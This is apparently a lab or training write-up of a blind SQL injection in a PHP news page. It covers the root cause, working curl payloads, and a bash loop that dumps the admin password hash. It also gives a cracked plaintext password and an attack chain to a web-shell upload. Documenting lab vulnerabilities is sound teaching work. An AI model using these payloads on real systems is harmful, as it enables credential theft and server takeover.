# 02 — Blind SQL injection on news detail

- **OWASP Top 10 (2021):** A03:2021 – Injection
- **Severity:** High
- **Difficulty:** Medium

## Where

`web/news.php:5,18` — `GET /news.php?id=<SQL>`

```php
$id = isset($_GET['id']) ? $_GET['id'] : '';
$db = get_read_db();
$r = mysqli_query($db, 'SELECT n.title, n.body, n.created_at, u.username FROM news n JOIN users u ON u.id = n.author_id WHERE n.id = ' . $id);
```

Unauthenticated, unquoted numeric context, string concatenation. Runs as
`osede_read` (SELECT on `osede_db.news` and `osede_db.users`).

## How it works (root cause)

No parameterisation; user input lands directly in the WHERE clause. The page
renders a news item when the predicate matches a row, otherwise an
"Inte hittad" heading — that is the boolean oracle. `SLEEP()` gives a
time-based oracle.

## Exploitation steps

1. Confirm the boolean difference:

   ```bash
   curl -s 'http://localhost:8080/news.php?id=1' | grep -o '<h1>[^<]*</h1>'          # news title
   curl -s 'http://localhost:8080/news.php?id=1 AND 1=2' | grep -o '<h1>[^<]*</h1>'  # "not found"
   ```

2. Time-based oracle (adds ~3 s):

   ```bash
   time curl -s 'http://localhost:8080/news.php?id=1 AND SLEEP(3)' -o /dev/null
   ```

3. Extract data bit by bit. Example: char-by-char dump of the admin hash:

   ```bash
   for pos in $(seq 1 32); do
     for ((c=48;c<58;c++)); do   # digits 0-9 (md5 is hex; widen range for other data)
       if curl -s "http://localhost:8080/news.php?id=1 AND (SELECT SUBSTRING(password_md5,$pos,1) FROM users WHERE username='admin')=CHAR($c)" \
            | grep -q '<div class="body">'; then printf '%d' $((c-48)); break; fi
     done
   done; echo
   ```

   (Any "row exists" probe works; `CHAR()` + `SUBSTRING` per position 1..32
   yields the full 32-char hash.)

## Working PoC (verified)

```
/news.php?id=1 AND 1=2                       → boolean false (not found)
/news.php?id=1 AND SLEEP(3)                  → 3 s delay
/news.php?id=1 AND (SELECT SUBSTRING(password_md5,1,1) FROM users WHERE username='admin')='3'
                                              → true
```

## Expected result / verification

Full hash: `36f97e92ef3b4c1c6a41e46cc95db899` — the unsalted md5 of
`Aragorn2025!`, the admin password (hashes are md5 without salt, see 22).
Offline lookup gives the plaintext; you can then log in as admin directly.

## Attack chain

```
blind SQLi (osede_read)
  → dump users.password_md5 for admin (and every other account)
  → crack md5 (no salt, 22) → login as admin
  → /panel/upload.php (16) → PHP shell → RCE
  (or use the same injection to read reset_codes, see 20)
```
